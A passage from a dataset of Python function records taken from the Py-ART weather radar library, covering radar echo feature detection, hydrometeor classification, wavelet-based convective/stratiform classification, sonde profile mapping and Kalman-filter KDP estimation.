    KWAJEX. J. Appl. Meteor., 44, 385-415. https://doi.org/10.1175/JAM2206.1

    Tomkins, L. M., S. E. Yuter, and M. A. Miller, 2024: Objective identification
    of faint and strong features in radar observations of winter storms. in prep.

    """"""
    if max_rad_km > 5:
        print('Max radius must be less than 5 km, exiting')
        raise
    if field is None:
        field = get_field_name('reflectivity')
        dB_averaging = True
    if dx is None:
        dx = grid.x['data'][1] - grid.x['data'][0]
    if dy is None:
        dy = grid.y['data'][1] - grid.y['data'][0]
    if bkg_rad_km * 1000 < 2 * dx or bkg_rad_km * 1000 < 2 * dy:
        print('Background radius for averaging must be at least 2 times dx and dy, exiting')
        raise
    z = grid.z['data']
    if level_m is None:
        try:
            ze = np.ma.copy(grid.fields[field]['data'][0, :, :])
        except:
            ze = np.ma.copy(grid.fields[field]['data'][:, :])
    else:
        zslice = np.argmin(np.abs(z - level_m))
        ze = np.ma.copy(grid.fields[field]['data'][zslice, :, :])
    (_, _, feature_best) = _feature_detection(ze, dx, dy, always_core_thres=always_core_thres, bkg_rad_km=bkg_rad_km, use_cosine=use_cosine, max_diff=max_diff, zero_diff_cos_val=zero_diff_cos_val, scalar_diff=scalar_diff, use_addition=use_addition, calc_thres=calc_thres, weak_echo_thres=weak_echo_thres, min_val_used=min_val_used, dB_averaging=dB_averaging, remove_small_objects=remove_small_objects, min_km2_size=min_km2_size, binary_close=binary_close, val_for_max_rad=val_for_max_rad, max_rad_km=max_rad_km, core_val=core_val, nosfcecho=nosfcecho, weakecho=weakecho, bkgd_val=bkgd_val, feat_val=feat_val)
    feature_dict = {'feature_detection': {'data': feature_best[None, :, :], 'standard_name': 'feature_detection', 'long_name': 'Feature Detection', 'valid_min': 0, 'valid_max': 3, 'comment_1': '{} = No surface echo/Undefined, {} = Background echo, {} = Features, {} = weak echo'.format(nosfcecho, bkgd_val, feat_val, weakecho)}}
    if estimate_flag:
        if underest_field is None:
            under_field = ze - estimate_offset
        elif underest_field is not None:
            under_field = np.ma.copy(grid.fields[underest_field]['data'][0, :, :])
        (_, _, feature_under) = _feature_detection(under_field, dx, dy, always_core_thres=always_core_thres, bkg_rad_km=bkg_rad_km, use_cosine=use_cosine, max_diff=max_diff, zero_diff_cos_val=zero_diff_cos_val, scalar_diff=scalar_diff, use_addition=use_addition, calc_thres=calc_thres, weak_echo_thres=weak_echo_thres, min_val_used=min_val_used, dB_averaging=dB_averaging, remove_small_objects=remove_small_objects, min_km2_size=min_km2_size, binary_close=binary_close, val_for_max_rad=val_for_max_rad, max_rad_km=max_rad_km, core_val=core_val, nosfcecho=nosfcecho, weakecho=weakecho, bkgd_val=bkgd_val, feat_val=feat_val)
        if overest_field is None:
            over_field = ze + estimate_offset
        elif overest_field is not None:
            over_field = np.ma.copy(grid.fields[overest_field]['data'][0, :, :])
        (_, _, feature_over) = _feature_detection(over_field, dx, dy, always_core_thres=always_core_thres, bkg_rad_km=bkg_rad_km, use_cosine=use_cosine, max_diff=max_diff, zero_diff_cos_val=zero_diff_cos_val, scalar_diff=scalar_diff, use_addition=use_addition, calc_thres=calc_thres, weak_echo_thres=weak_echo_thres, min_val_used=min_val_used, dB_averaging=dB_averaging, remove_small_objects=remove_small_objects, min_km2_size=min_km2_size, binary_close=binary_close, val_for_max_rad=val_for_max_rad, max_rad_km=max_rad_km, core_val=core_val, nosfcecho=nosfcecho, weakecho=weakecho, bkgd_val=bkgd_val, feat_val=feat_val)
        feature_dict['feature_under'] = {'data': feature_under[None, :, :], 'standard_name': 'feature_detection_under', 'long_name': 'Feature Detection Underestimate', 'valid_min': 0, 'valid_max': 3, 'comment_1': '{} = No surface echo/Undefined, {} = Background echo, {} = Features, {} = weak echo'.format(nosfcecho, bkgd_val, feat_val, weakecho)}
        feature_dict['feature_over'] = {'data': feature_over[None, :, :], 'standard_name': 'feature_detection_over', 'long_name': 'Feature Detection Overestimate', 'valid_min': 0, 'valid_max': 3, 'comment_1': '{} = No surface echo/Undefined, {} = Background echo, {} = Features, {} = weak echo'.format(nosfcecho, bkgd_val, feat_val, weakecho)}
    return feature_dict"
ARM-DOE/pyart,hydroclass_semisupervised,"def hydroclass_semisupervised(radar, mass_centers=None, weights=np.array([1.0, 1.0, 1.0, 0.75, 0.5]), refl_field=None, zdr_field=None, rhv_field=None, kdp_field=None, temp_field=None, hydro_field=None):
    """"""
    Classifies precipitation echoes following the approach by Besic et al
    (2016).

    Parameters
    ----------
    radar : radar
        Radar object.
    mass_centers : ndarray 2D, optional
        The centroids for each variable and hydrometeor class in (nclasses,
        nvariables).
    weights : ndarray 1D, optional
        The weight given to each variable.
    refl_field, zdr_field, rhv_field, kdp_field, temp_field : str, optional
        Inputs. Field names within the radar object which represent the
        horizonal reflectivity, the differential reflectivity, the copolar
        correlation coefficient, the specific differential phase and the
        temperature field. A value of None for any of these parameters will
        use the default field name as defined in the Py-ART configuration
        file.
    hydro_field : str, optional
        Output. Field name which represents the hydrometeor class field.
        A value of None will use the default field name as defined in the
        Py-ART configuration file.

    Returns
    -------
    hydro : dict
        Hydrometeor classification field.

    References
    ----------
    Besic, N., Figueras i Ventura, J., Grazioli, J., Gabella, M., Germann, U.,
    and Berne, A.: Hydrometeor classification through statistical clustering
    of polarimetric radar measurements: a semi-supervised approach,
    Atmos. Meas. Tech., 9, 4425-4445, doi:10.5194/amt-9-4425-2016, 2016

    """"""
    lapse_rate = -6.5
    if mass_centers is None:
        if radar.instrument_parameters is not None:
            if 'frequency' in radar.instrument_parameters:
                mass_centers = _get_mass_centers(radar.instrument_parameters['frequency']['data'][0])
            else:
                mass_centers = _mass_centers_table()['C']
                warn('Radar frequency unknown. Default coefficients for C band will be applied.')
        else:
            mass_centers = _mass_centers_table()['C']
            warn('Radar instrument parameters is empty. So frequency is unknown. Default coefficients for C band will be applied.')
    if refl_field is None:
        refl_field = get_field_name('reflectivity')
    if zdr_field is None:
        zdr_field = get_field_name('differential_reflectivity')
    if rhv_field is None:
        rhv_field = get_field_name('cross_correlation_ratio')
    if kdp_field is None:
        kdp_field = get_field_name('specific_differential_phase')
    if temp_field is None:
        temp_field = get_field_name('temperature')
    if hydro_field is None:
        hydro_field = get_field_name('radar_echo_classification')
    radar.check_field_exists(refl_field)
    radar.check_field_exists(zdr_field)
    radar.check_field_exists(rhv_field)
    radar.check_field_exists(kdp_field)
    radar.check_field_exists(temp_field)
    refl = radar.fields[refl_field]['data']
    zdr = radar.fields[zdr_field]['data']
    rhohv = radar.fields[rhv_field]['data']
    kdp = radar.fields[kdp_field]['data']
    temp = radar.fields[temp_field]['data']
    relh = temp * (1000.0 / lapse_rate)
    refl_std = _standardize(refl, 'Zh')
    zdr_std = _standardize(zdr, 'ZDR')
    kdp_std = _standardize(kdp, 'KDP')
    rhohv_std = _standardize(rhohv, 'RhoHV')
    relh_std = _standardize(relh, 'relH')
    mc_std = np.zeros(np.shape(mass_centers))
    mc_std[:, 0] = _standardize(mass_centers[:, 0], 'Zh')
    mc_std[:, 1] = _standardize(mass_centers[:, 1], 'ZDR')
    mc_std[:, 2] = _standardize(mass_centers[:, 2], 'KDP')
    mc_std[:, 3] = _standardize(mass_centers[:, 3], 'RhoHV')
    mc_std[:, 4] = _standardize(mass_centers[:, 4], 'relH')
    (hydroclass_data, min_dist) = _assign_to_class(refl_std, zdr_std, kdp_std, rhohv_std, relh_std, mc_std, weights=weights)
    hydro = get_metadata(hydro_field)
    hydro['data'] = hydroclass_data
    return hydro"
ARM-DOE/pyart,_standardize,"def _standardize(data, field_name, mx=None, mn=None):
    """"""
    Streches the radar data to -1 to 1 interval.

    Parameters
    ----------
    data : array
        Radar field.
    field_name : str
        Type of field (relH, Zh, ZDR, KDP or RhoHV).
    mx, mn : floats or None, optional
        Data limits for array values.

    Returns
    -------
    field_std : dict
        Standardized radar data.

    """"""
    if field_name == 'relH':
        field_std = 2.0 / (1.0 + np.ma.exp(-0.005 * data)) - 1.0
        return field_std
    if mx is None or mn is None:
        dlimits_dict = _data_limits_table()
        if field_name not in dlimits_dict:
            raise ValueError('Field ' + field_name + ' unknown. ' + 'Valid field names for standardizing are: ' + 'relH, Zh, ZDR, KDP and RhoHV')
        (mx, mn) = dlimits_dict[field_name]
    if field_name == 'KDP':
        data[data < -0.5] = -0.5
        data = 10.0 * np.ma.log10(data + 0.6)
    elif field_name == 'RhoHV':
        data = 10.0 * np.ma.log10(1.0 - data)
    mask = np.ma.getmaskarray(data)
    field_std = 2.0 * (data - mn) / (mx - mn) - 1.0
    field_std[data < mn] = -1.0
    field_std[data > mx] = 1.0
    field_std[mask] = np.ma.masked
    return field_std"
ARM-DOE/pyart,_assign_to_class,"def _assign_to_class(zh, zdr, kdp, rhohv, relh, mass_centers, weights=np.array([1.0, 1.0, 1.0, 0.75, 0.5])):
    """"""
    Assigns an hydrometeor class to a radar range bin computing
    the distance between the radar variables an a centroid.

    Parameters
    ----------
    zh, zdr, kdp, rhohv, relh : radar fields
        Variables used for assignment normalized to [-1, 1] values.
    mass_centers : matrix
        Centroids normalized to [-1, 1] values.
    weights : array, optional
        The weight given to each variable.

    Returns
    -------
    hydroclass : int array
        The index corresponding to the assigned class.
    mind_dist : float array
        The minimum distance to the centroids.

    """"""
    nrays = zh.shape[0]
    nbins = zdr.shape[1]
    nclasses = mass_centers.shape[0]
    nvariables = mass_centers.shape[1]
    data = np.ma.array([zh, zdr, kdp, rhohv, relh])
    weights_mat = np.broadcast_to(weights.reshape(nvariables, 1, 1), (nvariables, nrays, nbins))
    dist = np.ma.zeros((nclasses, nrays, nbins), dtype='float64')
    for i in range(nclasses):
        centroids_class = mass_centers[i, :]
        centroids_class = np.broadcast_to(centroids_class.reshape(nvariables, 1, 1), (nvariables, nrays, nbins))
        dist[i, :, :] = np.ma.sqrt(np.ma.sum((centroids_class - data) ** 2.0 * weights_mat, axis=0))
    class_vec = dist.argsort(axis=0, fill_value=1e+41)
    dist.sort(axis=0, fill_value=1e+41)
    min_dist = dist[0, :, :]
    mask = np.ma.getmaskarray(zh)
    hydroclass = class_vec[0, :, :] + 1
    hydroclass[mask] = 0
    return (hydroclass, min_dist)"
ARM-DOE/pyart,_get_mass_centers,"def _get_mass_centers(freq):
    """"""
    Get mass centers for a particular frequency.

    Parameters
    ----------
    freq : float
        Radar frequency [Hz].

    Returns
    -------
    mass_centers : ndarray 2D
        The centroids for each variable and hydrometeor class in (nclasses,
        nvariables).

    """"""
    mass_centers_dict = _mass_centers_table()
    freq_band = get_freq_band(freq)
    if freq_band is not None and freq_band in mass_centers_dict:
        return mass_centers_dict[freq_band]
    if freq < 4000000000.0:
        freq_band_aux = 'C'
    elif freq > 12000000000.0:
        freq_band_aux = 'X'
    mass_centers = mass_centers_dict[freq_band_aux]
    warn('Radar frequency out of range. ' + 'Centroids only valid for C or X band. ' + freq_band_aux + ' band centroids will be applied')
    return mass_centers"
ARM-DOE/pyart,_mass_centers_table,"def _mass_centers_table():
    """"""
    Defines the mass centers look up table for each frequency band.

    Returns
    -------
    mass_centers_dict : dict
        A dictionary with the mass centers for each frequency band.

    """"""
    nclasses = 9
    nvariables = 5
    mass_centers_c = np.zeros((nclasses, nvariables))
    mass_centers_x = np.zeros((nclasses, nvariables))
    mass_centers_dict = dict()
    mass_centers_c[0, :] = [13.5829, 0.4063, 0.0497, 0.9868, 1330.3]
    mass_centers_c[1, :] = [2.8453, 0.2457, 0.0, 0.9798, 653.8]
    mass_centers_c[2, :] = [7.6597, 0.218, 0.0019, 0.9799, -1426.5]
    mass_centers_c[3, :] = [31.6815, 0.3926, 0.0828, 0.9978, 535.3]
    mass_centers_c[4, :] = [39.4703, 1.0734, 0.4919, 0.9876, -1036.3]
    mass_centers_c[5, :] = [4.8267, -0.569, 0.0, 0.9691, 869.8]
    mass_centers_c[6, :] = [30.8613, 0.9819, 0.1998, 0.9845, -66.1]
    mass_centers_c[7, :] = [52.3969, 2.1094, 2.4675, 0.973, -1550.2]
    mass_centers_c[8, :] = [50.6186, -0.0649, 0.0946, 0.9904, 1179.9]
    mass_centers_dict.update({'C': mass_centers_c})
    mass_centers_x[0, :] = [19.077, 0.4139, 0.0099, 0.9841, 1061.7]
    mass_centers_x[1, :] = [3.9877, 0.504, 0.0, 0.9642, 856.6]
    mass_centers_x[2, :] = [20.7982, 0.3177, 0.0004, 0.9858, -1375.1]
    mass_centers_x[3, :] = [34.7124, -0.3748, 0.0988, 0.9828, 1224.2]
    mass_centers_x[4, :] = [33.0134, 0.6614, 0.0819, 0.9802, -1169.8]
    mass_centers_x[5, :] = [8.261, -0.4681, 0.0, 0.9722, 1100.7]
    mass_centers_x[6, :] = [35.1801, 1.283, 0.1322, 0.9162, -159.8]
    mass_centers_x[7, :] = [52.4539, 2.3714, 1.112, 0.9382, -1618.5]
    mass_centers_x[8, :] = [44.2216, -0.3419, 0.0687, 0.9683, 1272.7]
    mass_centers_dict.update({'X': mass_centers_x})
    return mass_centers_dict"
ARM-DOE/pyart,_data_limits_table,"def _data_limits_table():
    """"""
    Defines the data limits used in the standardization.

    Returns
    -------
    dlimits_dict : dict
        A dictionary with the limits for each variable.

    """"""
    dlimits_dict = dict()
    dlimits_dict.update({'Zh': (60.0, -10.0)})
    dlimits_dict.update({'ZDR': (5.0, -5.0)})
    dlimits_dict.update({'KDP': (7.0, -10.0)})
    dlimits_dict.update({'RhoHV': (-5.23, -50.0)})
    return dlimits_dict"
ARM-DOE/pyart,get_freq_band,"def get_freq_band(freq):
    """"""
    Returns the frequency band name (S, C, X, ...).

    Parameters
    ----------
    freq : float
        Radar frequency [Hz].

    Returns
    -------
    freq_band : str
        Frequency band name.

    """"""
    if freq >= 2000000000.0 and freq < 4000000000.0:
        return 'S'
    if freq >= 4000000000.0 and freq < 8000000000.0:
        return 'C'
    if freq >= 8000000000.0 and freq <= 12000000000.0:
        return 'X'
    warn('Unknown frequency band')
    return None"
ARM-DOE/pyart,conv_strat_raut,"def conv_strat_raut(grid, refl_field, cappi_level=0, zr_a=200, zr_b=1.6, core_wt_threshold=5, conv_wt_threshold=1.5, conv_scale_km=25, min_reflectivity=5, conv_min_refl=25, conv_core_threshold=42, override_checks=False):
    """"""
    A computationally efficient method to classify radar echoes into convective cores, mixed convection,
    and stratiform regions for gridded radar reflectivity field.

    This function uses à trous wavelet transform (ATWT) for multiresolution (i.e. scale) analysis of radar field,
    focusing on precipitation structure over reflectivity thresholds for robust echo classification (Raut et al 2008, 2020).

    Parameters
    ----------
    grid : PyART Grid
        Grid object containing radar data.
    refl_field : str
        Field name for reflectivity data in the Py-ART grid object.
    zr_a : float, optional
        Coefficient 'a' in the Z-R relationship Z = a*R^b for reflectivity to rain rate conversion.
        The algorithm is not sensitive to precise values of 'zr_a' and 'zr_b'; however,
        they must be adjusted based on the type of radar used.
        Default is 200.
    zr_b : float, optional
        Coefficient 'b' in the Z-R relationship Z = a*R^b. Default is 1.6.
    core_wt_threshold : float, optional
        Threshold for wavelet components to separate convective cores from mix-intermediate type.
        Default is 5. Recommended values are between 4 and 6.
    conv_wt_threshold : float, optional
        Threshold for significant wavelet components to separate all convection from stratiform.
        Default is 1.5. Recommended values are between 1 and 2.
    conv_scale_km : float, optional
        Approximate scale break (in km) between convective and stratiform scales.
        Scale break may vary over different regions and seasons
        (Refere to Raut et al 2018 for more discussion on scale-breaks). Note that the
        algorithm is insensitive to small variations in the scale break due to the
        dyadic nature of the scaling. The actual scale break used in the calculation of wavelets
        is returned in the output dictionary by parameter `scale_break_used`.
        Default is 25 km. Recommended values are between 16 and 32 km.
    min_reflectivity : float, optional
        Minimum reflectivity threshold. Reflectivities below this value are not classified.
        Default is 5 dBZ. This value must be greater than or equal to '0'.
    conv_min_refl : float, optional
        Reflectivity values lower than this threshold will be always considered as non-convective.
        Default is 25 dBZ. Recommended values are between 25 and 30 dBZ.
    conv_core_threshold : float, optional
        Reflectivities above this threshold are classified as convective cores if wavelet components are significant (See: conv_wt_threshold).
        Default is 42 dBZ.
        Recommended value must be is greater than or equal to 40 dBZ. The algorithm is not sensitive to this value.
    override_checks : bool, optional
        If set to True, the function will bypass the sanity checks for above parameter values.
        This allows the user to use custom values for parameters, even if they fall outside
        the recommended ranges. The default is False.

    Returns
    -------

    dict :
    A dictionary structured as a Py-ART grid field, suitable for adding to a Py-ART Grid object. The dictionary
    contains the classification data and associated metadata. The classification categories are as follows:
        - 3: Convective Cores: associated with strong updrafts and active collision-coalescence.
        - 2: Mixed-Intermediate: capturing a wide range of convective activities, excluding the convective cores.
        - 1: Stratiform: remaining areas with more uniform and less intense precipitation.
        - 0: Unclassified: for reflectivity below the minimum threshold.


    References
    ----------
    Raut, B. A., Karekar, R. N., & Puranik, D. M. (2008). Wavelet-based technique to extract convective clouds from
    infrared satellite images. IEEE Geosci. Remote Sens. Lett., 5(3), 328-330.

    Raut, B. A., Seed, A. W., Reeder, M. J., & Jakob, C. (2018). A multiplicative cascade model for high‐resolution
    space‐time downscaling of rainfall. J. Geophys. Res. Atmos., 123(4), 2050-2067.

    Raut, B. A., Louf, V., Gayatri, K., Murugavel, P., Konwar, M., & Prabhakaran, T. (2020). A multiresolution technique
    for the classification of precipitation echoes in radar data. IEEE Trans. Geosci. Remote Sens., 58(8), 5409-5415.
    """"""
    if not isinstance(grid, Grid):
        raise TypeError(""The 'grid' is not a Py-ART Grid object."")
    dx = grid.x['data'][1] - grid.x['data'][0]
    dy = grid.y['data'][1] - grid.y['data'][0]
    if dx != dy:
        warn('Warning: Grid resolution `dx` and `dy` should be comparable for correct results.', UserWarning)
    scale_break = calc_scale_break(res_meters=dx, conv_scale_km=conv_scale_km)
    scale_break_km = 2 ** (scale_break - 1) * dx / 1000
    if not override_checks:
        conv_core_threshold = max(40, conv_core_threshold)
        core_wt_threshold = max(4, min(core_wt_threshold, 6))
        conv_wt_threshold = max(1, min(conv_wt_threshold, 2))
        conv_scale_km = max(16, min(conv_scale_km, 32))
        min_reflectivity = max(0, min_reflectivity)
        conv_min_refl = max(25, min(conv_min_refl, 30))
    reclass = wavelet_reclass(grid, refl_field, cappi_level, zr_a, zr_b, core_wt_threshold=core_wt_threshold, conv_wt_threshold=conv_wt_threshold, scale_break=scale_break, min_reflectivity=min_reflectivity, conv_min_refl=conv_min_refl, conv_core_threshold=conv_core_threshold)
    reclass = np.expand_dims(reclass, axis=0)
    reclass_dict = {'wt_reclass': {'data': reclass, 'standard_name': 'wavelet_echo_class', 'long_name': 'Wavelet-based multiresolution radar echo classification', 'valid_min': 0, 'valid_max': 3, 'classification_description': '0: Unclassified, 1: Stratiform, 2: Mixed-Intermediate, 3: Convective Cores', 'parameters': {'refl_field': refl_field, 'cappi_level': cappi_level, 'zr_a': zr_a, 'zr_b': zr_b, 'core_wt_threshold': core_wt_threshold, 'conv_wt_threshold': conv_wt_threshold, 'conv_scale_km': conv_scale_km, 'scale_break_used': int(scale_break_km), 'min_reflectivity': min_reflectivity, 'conv_min_refl': conv_min_refl, 'conv_core_threshold': conv_core_threshold}}}
    return reclass_dict"
ARM-DOE/pyart,map_profile_to_gates,"def map_profile_to_gates(profile, heights, radar, toa=None, profile_field=None, height_field=None):
    """"""
    Given a profile of a variable map it to the gates of radar assuming 4/3Re.

    Parameters
    ----------
    profile : array
        Profile array to map.
    heights : array
        Monotonically increasing heights in meters with same shape as profile.
    radar : Radar
        Radar to map to.
    toa : float, optional
        Top of atmosphere, where to use profile up to. If None check for
        mask and use lowest element, if no mask uses whole profile.
    height_field : str, optional
        Name to use for height field metadata. None will use the default field
        name from the Py-ART configuration file.
    profile_field : str, optional
        Name to use for interpolate profile field metadata. None will use the
        default field name from the Py-ART configuration file.

    Returns
    -------
    height_dict, profile_dict : dict
        Field dictionaries containing the height of the gates and the profile
        interpolated onto the radar gates.

    """"""
    (rg, azg) = np.meshgrid(radar.range['data'], radar.azimuth['data'])
    (rg, eleg) = np.meshgrid(radar.range['data'], radar.elevation['data'])
    (_, _, z) = antenna_to_cartesian(rg / 1000.0, azg, eleg)
    if isinstance(z, np.ma.MaskedArray):
        z = z.filled(np.NaN)
    if toa is None:
        ismasked = np.where(np.ma.getmaskarray(profile))[0]
        if len(ismasked) == 0:
            toa = None
        else:
            toa = ismasked.min()
    f_interp = interpolate.interp1d(heights[:toa], profile[:toa], bounds_error=False, fill_value=get_fillvalue())
    fld = np.ma.masked_equal(f_interp(z + radar.altitude['data'][0]), get_fillvalue())
    if height_field is None:
        height_field = get_field_name('height')
    height_dict = get_metadata(height_field)
    height_dict['data'] = z + radar.altitude['data'][0]
    if profile_field is None:
        profile_field = get_field_name('interpolated_profile')
    profile_dict = get_metadata(profile_field)
    profile_dict['data'] = fld
    return (height_dict, profile_dict)"
ARM-DOE/pyart,fetch_radar_time_profile,"def fetch_radar_time_profile(sonde_dset, radar, time_key='time', height_key='height', nvars=None):
    """"""
    Extract the correct profile from a interpolated sonde.

    This is an ARM specific method which extract the correct profile out of
    netCDF Variables from a Interpolated Sonde VAP for the volume start time
    of a radar object.

    Parameters
    ----------
    sonde_dset : Dataset
        Interpolate sonde Dataset.
    radar : Radar
        Radar object from which the nearest profile will be found.
    time_key : string, optional
        Key to find a CF startard time variable.
    height_key : string, optional
        Key to find profile height data.
    nvars : list, optional
        NetCDF variable to generated profiles for. If None (the default) all
        variables with dimension of time, height will be found in ncvars.

    Returns
    -------
    return_dic : dict
        Profiles at the start time of the radar.

    """"""
    ncvars = sonde_dset.variables
    if nvars is None:
        time_height_shape = (len(ncvars[time_key]), len(ncvars[height_key]))
        nvars = [k for (k, v) in ncvars.items() if v.shape == time_height_shape]
    radar_start = num2date(radar.time['data'][0], radar.time['units'])
    radar_day_start = DatetimeGregorian(radar_start.year, radar_start.month, radar_start.day)
    seconds_since_start_of_day = (radar_start - radar_day_start).seconds
    time_index = abs(ncvars[time_key][:] - seconds_since_start_of_day).argmin()
    return_dic = {key: ncvars[key][time_index, :] for key in nvars}
    return_dic[height_key] = ncvars[height_key][:]
    return return_dic"
ARM-DOE/pyart,kdp_schneebeli,"def kdp_schneebeli(radar, gatefilter=None, fill_value=None, psidp_field=None, kdp_field=None, phidp_field=None, band='C', rcov=0, pcov=0, prefilter_psidp=False, filter_opt=None, parallel=True):
    """"""
    Estimates Kdp with the Kalman filter method by Schneebeli and al. (2014)
    for a set of psidp measurements.

    Parameters
    ----------
    radar : Radar
        Radar containing differential phase field.
    gatefilter : GateFilter, optional
        A GateFilter indicating radar gates that should be excluded when
        analysing differential phase measurements.
    fill_value : float, optional
        Value indicating missing or bad data in differential phase field, if
        not specified, the default in the Py-ART configuration file will be
        used.
    psidp_field : str, optional
        Total differential phase field. If None, the default field name must be
        specified in the Py-ART configuration file.
    kdp_field : str, optional
        Specific differential phase field. If None, the default field name must
        be specified in the Py-ART configuration file.
    phidp_field : str, optional
        Propagation differential phase field. If None, the default field name
        must be specified in the Py-ART configuration file.
    band : char, optional
       Radar frequency band string. Accepted ""X"", ""C"", ""S"" (capital
       or not). The band is used to compute intercepts -c and slope b of the
       delta = b*Kdp+c relation.
    rcov : 3x3 float array, optional
        Measurement error covariance matrix.
    pcov : 4x4 float array, optional
        Scaled state transition error covariance matrix.
    prefilter_psidp : bool, optional
        If set, the psidp measurements will first be filtered with the
        filter_psidp method, which can improve the quality of the final Kdp.
    filter_opt : dict, optional
        The arguments for the prefilter_psidp method, if empty, the defaults
        arguments of this method will be used.
    parallel : bool, optional
        Flag to enable parallel computation (one core for every psidp profile).

    Returns
    -------
    kdp_dict : dict
        Retrieved specific differential phase data and metadata.
    kdp_std_dict : dict
        Estimated specific differential phase standard dev. data and metadata.
    phidpr_dict,: dict
        Retrieved differential phase data and metadata.

    References
    ----------
    Schneebeli, M., Grazioli, J., and Berne, A.: Improved Estimation
    of the Specific Differential Phase SHIFT Using a Compilation of
    Kalman Filter Ensembles, IEEE T. Geosci. Remote Sens., 52,
    5137-5149, doi:10.1109/TGRS.2013.2287017, 2014.

    """"""
    if parallel:
        import multiprocessing as mp
        pool = mp.Pool(processes=mp.cpu_count(), maxtasksperchild=1)
    if fill_value is None:
        fill_value = get_fillvalue()
    if psidp_field is None:
        psidp_field = get_field_name('differential_phase')
    if kdp_field is None:
        kdp_field = get_field_name('specific_differential_phase')
    if phidp_field is None:
        phidp_field = get_field_name('differential_phase')
    dr = _parse_range_resolution(radar, check_uniform=True)
    if prefilter_psidp:
        if filter_opt is None:
            filter_opt = {}
        filter_opt['psidp_field'] = psidp_field
        psidp_o = filter_psidp(radar, **filter_opt)
    else:
        psidp_o = radar.fields[psidp_field]['data']
    if gatefilter is not None:
        psidp_o = np.ma.masked_where(gatefilter.gate_excluded, psidp_o)
    func = partial(_kdp_kalman_profile, dr=dr, band=band, rcov=rcov, pcov=pcov)
    all_psidp_prof = list(psidp_o)
    if parallel:
        list_est = pool.map(func, all_psidp_prof)
    else:
        list_est = map(func, all_psidp_prof)
    kdp = np.zeros(psidp_o.shape) * np.nan
    kdp = np.ma.masked_array(kdp, fill_value=fill_value)
    kdp_stdev = np.zeros(psidp_o.shape) * np.nan
    kdp_stdev = np.ma.masked_array(kdp_stdev, fill_value=fill_value)
    phidp_rec = np.zeros(psidp_o.shape) * np.nan
    phidp_rec = np.ma.masked_array(phidp_rec, fill_value=fill_value)
    for (i, size) in enumerate(list_est):
        kdp[i, 0:len(size[0])] = size[0]
        kdp_stdev[i, 0:len(size[1])] = size[1]
        phidp_rec[i, 0:len(size[2])] = size[2]
    if isinstance(psidp_o, np.ma.masked_array):
        masked = psidp_o.mask
        kdp = np.ma.array(kdp, mask=masked, fill_value=fill_value)
        kdp_stdev = np.ma.array(kdp_stdev, mask=masked, fill_value=fill_value)
        phidp_rec = np.ma.array(phidp_rec, mask=masked, fill_value=fill_value)
    kdp_dict = get_metadata(kdp_field)
    kdp_dict['data'] = kdp
    phidpr_dict = get_metadata(phidp_field)
    phidpr_dict['data'] = phidp_rec
    kdp_stdev_dict = {}
    kdp_stdev_dict['units'] = 'degrees/km'
    kdp_stdev_dict['standard_name'] = 'estimated KDP stdev'
    kdp_stdev_dict['long_name'] = 'Estimated stdev of spec. diff. phase (KDP)'
    kdp_stdev_dict['coordinates'] = 'elevation azimuth range'
    kdp_stdev_dict['data'] = kdp_stdev
    kdp_stdev_dict['valid_min'] = 0.0
    if parallel:
        pool.close()
    return (kdp_dict, kdp_stdev_dict, phidpr_dict)"
ARM-DOE/pyart,_kdp_estimation_backward_fixed,"def _kdp_estimation_backward_fixed(psidp_in, rcov, pcov_scale, f, f_transposed, h_plus, c1, c2, b1, b2, kdp_th, mpsidp):
    """"""
    Processing one profile of Psidp and estimating Kdp and Phidp
    with the KFE algorithm described in Schneebeli et al, 2014
    IEEE_TGRS. This routine estimates Kdp in the backward
    direction given a set of matrices that define the Kalman
    filter.

    Parameters
    ----------
    psidp_in : ndarray
        One-dimensional vector of length -nrg- containining the input psidp
        [degrees].
    rcov : 3x3 float array
        Measurement error covariance matrix.
    pcov_scale : 4x4 float array
        Scaled state transition error covariance matrix.
    f : 4x4 float array
        Forward state prediction matrix [4x4].
    f_transposed : 4x4 float array
        Transpose of F.
    h_plus : 4x3 float array
        Measurement prediction matrix [4x3].
    c1, c2, b1, b2 : floats
        The values of the intercept of the relation c = b*Kdp - delta.
        This relation uses b1, c1 IF kdp is lower than a kdp_th and b2, c2
        otherwise kdp_th.
    kdp_th : float
        The kdp threshold which separates the two Kdp - delta regime
        i.e. the power law relating delta to Kdp will be different if Kdp is
        larger or smaller than kdp_th.
    mpsidp : float
        Final observed value of psidp along the radial (usually also
        the max value), needed for inverting the psidp vector.

    Returns
    -------
    kdp : ndarray
        Filtered Kdp [degrees/km]. Same length as Psidp.
    error_kdp : ndarray
        Estimated error on Kdp values.

    """"""
    psidp = psidp_in
    psidp = mpsidp - psidp[::-1]
    nrg_new = len(psidp)
    s = np.zeros([4, 1])
    z = np.zeros([3, 1])
    identity_i = np.eye(4)
    p = identity_i * 4.0
    kdp = np.zeros([nrg_new])
    kdp_error = np.zeros([nrg_new])
    for ii in range(0, nrg_new - 1):
        z[0] = psidp[ii]
        z[1] = psidp[ii + 1]
        s_pred = np.dot(f, s)
        p_pred = np.dot(f, np.dot(p, f_transposed)) + pcov_scale
        if s_pred[0] > kdp_th:
            h_plus[2, 0] = b2
            z[2] = c2
        else:
            h_plus[2, 0] = b1
            z[2] = c1
        aludc = np.dot(h_plus, np.dot(p_pred, h_plus.T)) + rcov
        b_mat = np.dot(h_plus, p_pred)
        cho = linalg.cho_factor(aludc)
        k = linalg.cho_solve(cho, b_mat, check_finite=False, overwrite_b=True).T
        s = np.dot(k, np.dot(-h_plus, s_pred) + z) + s_pred
        p = np.dot(identity_i - np.dot(k, h_plus), p_pred)
        kdp[ii] = s[0]
        kdp_error[ii] = p[0, 0]
    n = len(kdp)
    dummy = np.copy(kdp)
    kdp[np.arange(SHIFT) + len(kdp) - SHIFT] = 0
    kdp[np.arange(n - 1 - SHIFT)] = dummy[np.arange(n - 1 - SHIFT) + SHIFT]
    kdp = kdp[::-1]
    kdp_error = kdp_error[::-1]
    return (kdp, kdp_error)"
ARM-DOE/pyart,_kdp_estimation_forward_fixed,"def _kdp_estimation_forward_fixed(psidp_in, rcov, pcov_scale, f, f_transposed, h_plus, c1, c2, b1, b2, kdp_th):
    """"""
    Processing one profile of Psidp and estimating Kdp and Phidp
    with the KFE algorithm described in Schneebeli et al, 2014
    IEEE_TGRS. This routine estimates Kdp in the forward
    direction given a set of matrices that define the Kalman
    filter.

    Parameters
    ----------
    psidp_in : ndarray
        One-dimensional vector of length -nrg- containining the input psidp
        [degrees].
    rcov : 3x3 float array.
        Measurement error covariance matrix.
    pcov_scale  : 4x4 float array
        Scaled state transition error covariance matrix.
    f : 4x4 float array
        Forward state prediction matrix [4x4].
